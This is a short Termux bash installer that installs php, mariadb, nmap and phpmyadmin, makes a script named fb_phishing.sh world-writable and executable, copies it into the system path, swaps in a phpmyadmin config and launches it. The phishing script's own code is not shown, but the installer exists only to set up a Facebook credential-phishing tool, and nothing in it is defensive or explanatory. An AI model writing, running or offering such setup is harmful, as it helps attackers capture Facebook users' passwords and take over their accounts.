#!/data/data/com.termux/files/usr/bin/bash


#variables      
                red='\033[1;31m'
                green='\033[1;32m'
                yellow='\033[1;33m'
                blue='\033[1;34m'
                magenta='\033[1;35m'
                cyan='\033[1;36m'
                reset='\033[0m'



apt update
apt upgrade -y
apt install figlet php mariadb nmap phpmyadmin -y

ls
chmod 777 fb_phishing.sh
ls
cp -r fb_phishing.sh /data/data/com.termux/files/usr/bin


mv config.inc2.php $PREFIX/share/phpmyadmin/config.inc.php

clear
bash fb_phishing.sh
